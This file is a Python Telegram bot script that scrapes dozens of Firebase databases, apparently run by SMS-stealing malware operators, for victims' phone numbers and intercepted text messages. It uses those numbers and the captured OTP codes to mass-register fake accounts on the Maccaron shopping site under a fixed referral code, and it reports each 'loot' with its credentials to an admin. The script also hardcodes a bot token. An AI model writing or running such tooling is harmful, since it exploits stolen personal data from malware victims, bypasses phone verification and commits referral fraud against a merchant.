import os
import sys
import re
import time
import uuid
import random
import string
import asyncio
import logging
import threading
from datetime import datetime
from collections import deque
from typing import Optional

import aiohttp
from aiohttp import web
import telebot
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# Windows Event Loop Fix
if sys.platform == 'win32':
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.WARNING)

# ================= HARDCODED USER CONFIGURATION =================
TOKEN = "8681737900:AAEJRXc7eKTS-lgpl1TjQytFP-TmxI2j4vA"
ADMIN_ID = 8681737900
MACCARON_REF = "MAHA282B65FD"

POLL_INTERVAL = 1.0            
NUM_WORKERS = 40               
OTP_TIMEOUT = 35               

USED_NUMBERS_FILE = "used_numbers.txt"
telebot.apihelper.RETRY_ON_ERROR = True

# Clean & Unique Firebase Panels List (Duplicates Removed)
DEFAULT_PANELS = [
    "https://hood-4ba1e-default-rtdb.firebaseio.com",
    "https://lucifer-spreader-default-rtdb.firebaseio.com",
    "https://totla-axis-default-rtdb.firebaseio.com",
    "https://rgggggggggg-e2547-default-rtdb.firebaseio.com",
    "https://bulbul8084-9a5df-default-rtdb.firebaseio.com",
    "https://systumm-c8526-default-rtdb.firebaseio.com",
    "https://ravan-98ef1-default-rtdb.firebaseio.com",
    "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com",
    "https://pmkishan8-6b70f-default-rtdb.firebaseio.com",
    "https://no-admin-e0a30-default-rtdb.firebaseio.com",
    "https://sexypayload-default-rtdb.firebaseio.com",
    "https://love-13ffc-default-rtdb.firebaseio.com",
    "https://deepak-c22e3-default-rtdb.firebaseio.com",
    "https://takul-cf410-default-rtdb.firebaseio.com",
    "https://rto-02-april06-default-rtdb.firebaseio.com",
    "https://projectpksk05102025-default-rtdb.firebaseio.com",
    "https://rajkumar-b6cbe-default-rtdb.firebaseio.com",
    "https://rtoo-6c8e6-default-rtdb.firebaseio.com",
    "https://upandar-bb51e-default-rtdb.firebaseio.com",
    "https://rolex-carder-default-rtdb.firebaseio.com",
    "https://rettiugh-default-rtdb.firebaseio.com",
    "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "https://jeet-op-default-rtdb.firebaseio.com",
    "https://vvvvv-b5eae-default-rtdb.firebaseio.com",
    "https://jaanubaby-f7b34-default-rtdb.firebaseio.com",
    "https://jj-gambler-default-rtdb.firebaseio.com",
    "https://suman-penal-default-rtdb.firebaseio.com",
    "https://tuuui-60b15-default-rtdb.firebaseio.com",
    "https://admin-sonu-8a567-default-rtdb.firebaseio.com",
    "https://rohet10-8919f-default-rtdb.firebaseio.com",
    "https://zeni-ae60b-default-rtdb.firebaseio.com",
    "https://maxxx-randi-default-rtdb.firebaseio.com",
    "https://gulabi-fuddi-default-rtdb.firebaseio.com",
    "https://comkingdir-default-rtdb.firebaseio.com",
    "https://tracegod-168d5-default-rtdb.firebaseio.com",
    "https://uc-op-ca3d2-default-rtdb.firebaseio.com",
    "https://smsforward-b2198.firebaseio.com",
    "https://hdrbf-485ec-default-rtdb.firebaseio.com",
    "https://bunty-51bcc-default-rtdb.firebaseio.com",
    "https://vishal-x-aravat-default-rtdb.firebaseio.com",
    "https://admin-cliwny-default-rtdb.firebaseio.com",
    "https://danish-77fe3-default-rtdb.firebaseio.com",
    "https://master-admin-6c650-default-rtdb.firebaseio.com",
    "https://panel-op-feb4d-default-rtdb.firebaseio.com",
    "https://your-project-id-default-rtdb.firebaseio.com",
    "https://pm23-98f32-default-rtdb.firebaseio.com",
    "https://iiiii-ade0e-default-rtdb.firebaseio.com",
    "https://pint-f465b-default-rtdb.firebaseio.com",
    "https://admin-panel-bfcdc-default-rtdb.firebaseio.com",
    "https://callmebitchfumckyou-default-rtdb.firebaseio.com",
    "https://demonrat-aa782-default-rtdb.firebaseio.com",
    "https://access20-3fc38-default-rtdb.firebaseio.com",
    "https://article-efd36-default-rtdb.firebaseio.com",
    "https://rajababukvirat-default-rtdb.firebaseio.com",
    "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com",
    "https://sandycall-18b15-default-rtdb.firebaseio.com",
    "https://suihd-default-rtdb.firebaseio.com",
    "https://harrwp-6be36-default-rtdb.firebaseio.com",
    "https://test-firebase.firebaseio.com",
    "https://adutappbylucy-default-rtdb.firebaseio.com",
    "https://download-b7393-default-rtdb.firebaseio.com",
    "https://bobnewloda-default-rtdb.firebaseio.com",
    "https://artikumari-abc97-default-rtdb.firebaseio.com",
    "https://seuihd-default-rtdb.firebaseio.com",
    "https://gigapaid-39e9c-default-rtdb.firebaseio.com",
    "https://angeladmin-9dedc-default-rtdb.firebaseio.com",
    "https://fir-new-fe8b8-default-rtdb.firebaseio.com",
    "https://priysnshuu-default-rtdb.firebaseio.com",
    "https://haab-b3370-default-rtdb.firebaseio.com",
    "https://ueuwuw-default-rtdb.firebaseio.com",
    "https://test.firebaseio.com",
    "https://jkhsadfhjk-default-rtdb.firebaseio.com",
    "https://sonic-d5c1a-default-rtdb.firebaseio.com",
    "https://jonisins-52271-default-rtdb.firebaseio.com",
    "https://dusman-abf8b-default-rtdb.firebaseio.com",
    "https://riyy-e012e-default-rtdb.firebaseio.com",
    "https://xkpz-f937a-default-rtdb.firebaseio.com",
    "https://hdhdhdh-38ae0-default-rtdb.firebaseio.com",
    "https://ppoi02-default-rtdb.firebaseio.com",
    "https://rto-e-challan--o23t-default-rtdb.firebaseio.com",
    "https://rajapp-ca991-default-rtdb.firebaseio.com",
    "https://lli02-dbc69-default-rtdb.firebaseio.com",
    "https://pk114-6e828-default-rtdb.firebaseio.com"
]

# Dynamic Panel Loader with Default Fallback
def load_panels():
    panels = []
    if os.path.exists("panels.txt"):
        with open("panels.txt", "r") as f:
            for line in f:
                clean_line = line.strip().strip('/')
                if clean_line and 'firebase' in clean_line:
                    panels.append(clean_line)
    
    if not panels:
        panels = DEFAULT_PANELS

    return list(set(panels))

RAW_URLS = load_panels()
DATABASES = {f"DB_{i+1}": url for i, url in enumerate(RAW_URLS)}

# ================= GLOBALS & LOCKS =================
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
_http_session: Optional[aiohttp.ClientSession] = None
GLOBAL_DEVICE_CACHE = {}
seen_sms_ids = set()
dead_panels = set()
first_run = True

pending_maccaron = {} 
processed_nums = set() 
looted_count = [0] 
live_message_id = None 
last_dash_text = ""
number_queue = None

LIVE_LOGS = deque(maxlen=7)

def add_log(msg):
    t = datetime.now().strftime("%H:%M:%S")
    log_str = f"<code>[{t}]</code> {msg}"
    LIVE_LOGS.appendleft(log_str)
    print(f"[{t}] {msg}")

FB_SEMAPHORE = asyncio.Semaphore(25) 

# ================= TELEGRAM SAFE SENDER =================
def safe_send_message(chat_id, text, **kwargs):
    try: return bot.send_message(chat_id, text, **kwargs)
    except Exception: return None

def safe_edit_message(text, chat_id, message_id, **kwargs):
    try: return bot.edit_message_text(text, chat_id, message_id, **kwargs)
    except Exception: return None

# ================= ERROR PARSER =================
def parse_api_error(resp_data):
    if not resp_data: return "Null API Response"
    try:
        if "errors" in resp_data and resp_data["errors"]:
            return resp_data["errors"][0].get("message", "API Error")
        if "data" in resp_data:
            for v in resp_data["data"].values():
                if isinstance(v, dict) and "errors" in v and v["errors"]:
                    return v["errors"][0].get("message", "Nested API Error")
    except Exception: pass
    return str(resp_data)[:50]

# ================= UTILS =================
def load_used_numbers():
    if os.path.exists(USED_NUMBERS_FILE):
        try:
            with open(USED_NUMBERS_FILE, "r") as f:
                processed_nums.update(line.strip() for line in f if line.strip())
        except Exception: pass

def save_used_number(num):
    processed_nums.add(num)
    try:
        with open(USED_NUMBERS_FILE, "a") as f:
            f.write(f"{num}\n")
    except Exception: pass

def get_maccaron_headers():
    return {
        "accept": "application/graphql-response+json, application/json",
        "content-type": "application/json",
        "origin": "https://maccaron.in",
        "referer": "https://maccaron.in/",
        "user-agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "x-store-mode": "maccaron",
        "traceparent": f"00-{uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-01"
    }

async def get_http_session():
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, enable_cleanup_closed=True)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def graphql_request(query: str, variables: dict):
    payload = {"query": query, "variables": variables}
    match = re.search(r'(?:mutation|query)\s+(\w+)', query)
    if match: payload["operationName"] = match.group(1)
    
    try:
        session = await get_http_session()
        async with session.post("https://graphql.maccaron.in/graphql/", json=payload, headers=get_maccaron_headers(), timeout=10) as r:
            if r.status == 200: return await r.json()
            elif r.status in [429, 403]: return {"error_status": r.status}
    except Exception: pass
    return None

def deep_phone_extract(data):
    phones = set()
    valid_keys = ('sim', 'num', 'phone', 'mob')
    def _extract(d):
        if isinstance(d, dict):
            for k, v in d.items():
                if isinstance(v, (str, int)):
                    if any(x in k.lower() for x in valid_keys):
                        clean = re.sub(r"\D", "", str(v))
                        if len(clean) >= 10 and clean[-10] in '6789':
                            phones.add(clean[-10:])
                else:
                    _extract(v)
        elif isinstance(d, list):
            for item in d:
                _extract(item)
    _extract(data)
    return phones

# ================= MACCARON API LOGIC =================
async def trigger_maccaron_otp(phone_10d: str):
    query = """
    mutation createOtp($input: OtpInput!) {
      createOtp(input: $input) {
        otp { status }
        errors { message }
      }
    }
    """
    resp = await graphql_request(query, {"input": {"receiver": phone_10d}})
    
    if resp and resp.get("error_status"): 
        add_log(f"🚫 Rate Limit Blocked: <code>{phone_10d}</code>")
        return "BLOCKED"

    if resp and resp.get("errors"):
        msg = parse_api_error(resp)
        add_log(f"⚠️ Sent Failed {phone_10d}: {msg}")
        return "FAILED"

    if resp and not resp.get("errors"):
        data = resp.get("data", {}).get("createOtp", {})
        if data.get("otp", {}).get("status") == "SENT":
            pending_maccaron[phone_10d] = {
                "phone": phone_10d, 
                "first_name": ''.join(random.choices(string.ascii_letters, k=6)).capitalize(),
                "last_name": ''.join(random.choices(string.ascii_letters, k=5)).capitalize(),
                "email": f"{uuid.uuid4().hex[:8]}@gmail.com",
                "password": f"Mac@{uuid.uuid4().hex[:6]}#",
                "timestamp": time.time()  
            }
            add_log(f"📱 OTP Sent: <code>{phone_10d}</code> (Waiting...)")
            return "SUCCESS"
            
    add_log(f"❌ Failed to send OTP: <code>{phone_10d}</code>")
    return "FAILED"

async def verify_and_signup(phone_10d: str, otp: str):
    data = pending_maccaron.pop(phone_10d, None)
    if not data: return
    
    add_log(f"🔑 Verifying OTP <code>{otp}</code> for {phone_10d}...")
    
    verify_query = """
    mutation verifyOtp($input: VerifyOtpInput!) {
      verifyOtp(input: $input) {
        otp { id }
        verified
        errors { message }
      }
    }
    """
    resp = await graphql_request(verify_query, {"input": {"receiver": data["phone"], "value": otp}})
    
    if not resp:
        add_log(f"⚠️ API Timeout / Blocked for <code>{phone_10d}</code>")
        return

    is_verified = resp.get("data", {}).get("verifyOtp", {}).get("verified")

    if is_verified:
        otp_id = resp["data"]["verifyOtp"]["otp"]["id"]
        
        signup_query = """
        mutation customerSignUp($input: CustomerSignUpInput!) {
          customerSignUp(input: $input) { 
            user { id email } 
            errors { message }
          }
        }
        """
        signup_vars = {
            "input": {
                "firstName": data["first_name"], "lastName": data["last_name"],
                "email": data["email"], "password": data["password"],
                "otpId": otp_id, "otpValue": otp, "mobileNumber": data["phone"],
                "referralCode": MACCARON_REF, "signupPlatform": "Web"
            }
        }
        
        sign_resp = await graphql_request(signup_query, signup_vars)
        if sign_resp and sign_resp.get("data", {}).get("customerSignUp", {}).get("user"):
            looted_count[0] += 1
            add_log(f"🎉 <b>SUCCESS! Looted:</b> <code>{phone_10d}</code>")
            
            succ_msg = (
                f"🎉 <b>MACCARON LOOT SUCCESS!</b>\n\n"
                f"📱 <b>Number:</b> {data['phone']}\n"
                f"📧 <b>Email:</b> <code>{data['email']}</code>\n"
                f"🔑 <b>Pass:</b> <code>{data['password']}</code>\n"
                f"🎁 <b>Code Used:</b> {MACCARON_REF}\n"
            )
            safe_send_message(ADMIN_ID, succ_msg, parse_mode="HTML")
            
        else:
            err = parse_api_error(sign_resp)
            add_log(f"⚠️ Signup Failed {phone_10d}: {err}")
    else:
        err = parse_api_error(resp)
        add_log(f"❌ Verify Failed <code>{phone_10d}</code>: {err}")

# ================= FIREBASE POLLING =================
async def fb_get(path: str, base: str):
    if base in dead_panels: return None
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=5) as r:
            if r.status == 200:
                data = await r.json(content_type=None)
                return data if isinstance(data, dict) else None
    except Exception: return None

async def fetch_db_data_safe(tag: str, url: str):
    async with FB_SEMAPHORE:
        devices = []
        try:
            sim, info, user, clients = await asyncio.gather(
                fb_get("All_Users/simDetails", url), fb_get("All_Users/Data/DeviceInfo", url), 
                fb_get("user_data", url), fb_get("clients", url), return_exceptions=True
            )
            
            dev_map = {}
            def add_nums(d_id, data_node):
                if not data_node: return
                nums = deep_phone_extract(data_node)
                if nums: dev_map.setdefault(d_id, set()).update(nums)

            if isinstance(sim, dict):
                for k, v in sim.items(): add_nums(k, v)
            if isinstance(info, dict):
                for k, v in info.items(): add_nums(k, v)
            if isinstance(user, dict):
                for k, v in user.items(): add_nums(k, v)
            if isinstance(clients, dict):
                for k, v in clients.items(): add_nums(k, v)
            
            for d_id, nums in dev_map.items():
                devices.append({"id": d_id, "numbers": list(nums), "base": url})

        except Exception: 
            dead_panels.add(url)
        return devices

async def poll_single_db(url: str):
    global first_run
    async with FB_SEMAPHORE:
        if url in dead_panels: return
        try:
            r_main, r_user, r_root = await asyncio.gather(
                fb_get("All_Users/sms", url), fb_get("user_sms", url), fb_get("sms", url), return_exceptions=True
            )
            
            devices = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d["base"] == url]
            dev_map = {d["id"]: d for d in devices}
            
            for bulk in (r_main, r_user, r_root):
                if not isinstance(bulk, dict): continue
                for dev_id, sms_dict in bulk.items():
                    if not isinstance(sms_dict, dict): continue
                    
                    device = dev_map.get(dev_id)
                    
                    for k, sms in sms_dict.items():
                        if not isinstance(sms, dict): continue
                        
                        sk = f"{url}/{dev_id}/{k}"
                        if sk in seen_sms_ids: continue
                        seen_sms_ids.add(sk)
                        
                        if first_run: continue
                        
                        body = str(sms.get("body") or sms.get("message") or "").lower()
                        
                        if "maccaron" in body or "verification" in body:
                            otp_match = re.search(r'\b(\d{6})\b', body)
                            if otp_match:
                                otp = otp_match.group(1)
                                matched = False
                                
                                if device:
                                    for num in device.get("numbers", []):
                                        if num in pending_maccaron:
                                            asyncio.create_task(verify_and_signup(num, otp))
                                            matched = True
                                
                                if not matched and len(pending_maccaron) > 0:
                                    oldest_num = list(pending_maccaron.keys())[0]
                                    asyncio.create_task(verify_and_signup(oldest_num, otp))
        except Exception: pass

# ================= ASYNC LOOPS =================
async def update_cache_loop():
    while True:
        try:
            tasks = [fetch_db_data_safe(tag, url) for tag, url in DATABASES.items() if url not in dead_panels]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            all_devices = [item for sublist in results if isinstance(sublist, list) for item in sublist]
            GLOBAL_DEVICE_CACHE["ALL"] = all_devices
            
            for dev in all_devices:
                for num in dev.get("numbers", []):
                    if num not in processed_nums and num not in pending_maccaron:
                        save_used_number(num)
                        await number_queue.put(num)
        except Exception: pass
        await asyncio.sleep(10) 

async def api_worker(worker_id):
    while True:
        try:
            num = await number_queue.get()
            result = await trigger_maccaron_otp(num)
            
            if result == "BLOCKED":
                await asyncio.sleep(4) 
                await number_queue.put(num)
                
        except Exception: pass
        finally:
            number_queue.task_done()
            await asyncio.sleep(0.1)

async def otp_janitor():
    while True:
        try:
            current_time = time.time()
            expired = [num for num, data in pending_maccaron.items() if current_time - data.get("timestamp", current_time) > OTP_TIMEOUT]
            for num in expired:
                pending_maccaron.pop(num, None)
                add_log(f"🗑️ Dropped <code>{num}</code> (No OTP in {OTP_TIMEOUT}s)")
        except Exception: pass
        await asyncio.sleep(2)

async def poll_loop():
    global first_run
    while True:
        tasks = [poll_single_db(url) for url in DATABASES.values() if url not in dead_panels]
        if tasks: await asyncio.gather(*tasks, return_exceptions=True)
        
        if first_run:
            add_log("🧹 Cleared old SMS. Listening for new ones...")
            first_run = False
            
        await asyncio.sleep(POLL_INTERVAL)

# ================= RENDER DUMMY WEB SERVER =================
async def handle_health_check(request):
    return web.Response(text="Bot Engine Active and Running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"🌐 Health Server running on port {port}")

# ================= THREADED DASHBOARD =================
def dashboard_thread_worker():
    global last_dash_text, live_message_id
    while True:
        time.sleep(3)
        if live_message_id:
            try:
                active = len(DATABASES) - len(dead_panels)
                qsize = number_queue.qsize() if number_queue else 0
                
                logs_formatted = "\n".join(list(LIVE_LOGS)) if LIVE_LOGS else "<i>No recent activity...</i>"
                
                text = (
                    f"🌟 <b>MACCARON PRO DASHBOARD</b>\n"
                    f"📡 Active Panels: {active}/{len(DATABASES)}\n"
                    f"⏳ In Queue: {qsize}\n"
                    f"📲 Waiting OTP: {len(pending_maccaron)}\n"
                    f"🏆 TOTAL LOOTS: {looted_count[0]}\n\n"
                    f"🖥️ <b>LIVE TERMINAL:</b>\n"
                    f"{logs_formatted}\n\n"
                    f"<i>🛡️ V12 Smart Engine Running... 🔄</i>"
                )
                
                if text != last_dash_text:
                    safe_edit_message(text, ADMIN_ID, live_message_id, parse_mode="HTML")
                    last_dash_text = text
            except Exception:
                pass

# ================= ASYNC ENGINE STARTER =================
def run_async_backend():
    global number_queue
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    number_queue = asyncio.Queue()
    
    loop.create_task(start_web_server())
    loop.create_task(update_cache_loop())
    loop.create_task(poll_loop())
    loop.create_task(otp_janitor()) 
    for i in range(NUM_WORKERS): 
        loop.create_task(api_worker(i))
    
    loop.run_forever()

# ================= TELEBOT HANDLERS =================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.chat.id != int(ADMIN_ID): return
    kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🟢 Open Dashboard", callback_data='dash'))
    
    try:
        bot.reply_to(message, f"🚀 <b>MACCARON ENGINE STARTED!</b>\nTarget Ref: <code>{MACCARON_REF}</code>\nTotal Databases Loaded: {len(DATABASES)}", reply_markup=kb, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Failed to reply /start: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'dash')
def handle_dash(call):
    global live_message_id
    
    if live_message_id:
        try:
            bot.delete_message(ADMIN_ID, live_message_id)
        except Exception: pass
        
    msg = safe_send_message(ADMIN_ID, "Initializing Dashboard...")
    if msg:
        live_message_id = msg.message_id
        add_log("🟢 Dashboard Initialized. Engine active.")

if __name__ == "__main__":
    load_used_numbers()
    
    threading.Thread(target=run_async_backend, daemon=True).start()
    threading.Thread(target=dashboard_thread_worker, daemon=True).start()
    
    print("🤖 Bot Started Successfully. Press Ctrl+C to exit safely.")
    
    while True:
        try:
            bot.polling(non_stop=True, timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"⚠️ Telegram Connection Dropped: {e}. Reconnecting in 5 seconds...")
            time.sleep(5)
